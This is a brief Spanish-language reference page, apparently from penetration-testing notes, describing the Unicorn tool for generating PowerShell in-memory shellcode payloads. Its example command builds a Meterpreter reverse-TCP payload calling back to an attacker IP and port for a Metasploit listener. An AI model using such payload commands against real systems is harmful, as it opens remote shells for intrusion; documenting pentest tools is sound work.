### **Explotación/Generación de Payloads/unicorn.md**

# Unicorn

## Descripción

**Unicorn** es una herramienta en Python para generar payloads que explotan técnicas de inyección de código en memoria, como el ataque de `shellcode` en PowerShell. Facilita la creación de scripts para pruebas de penetración.

## Uso

```bash
python unicorn.py [payload] [ip] [puerto]
```

### Opciones principales

- **Payloads soportados**: Especifica el tipo de payload a generar (ej. `windows/meterpreter/reverse_tcp`).
- **Dirección IP**: IP del atacante para la conexión inversa.
- **Puerto**: Puerto que escuchará el atacante.

## Ejemplos

- Generar un payload PowerShell:

  ```bash
  python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.100 4444
  ```

- El script generará un archivo con el código PowerShell y un listener para Metasploit.
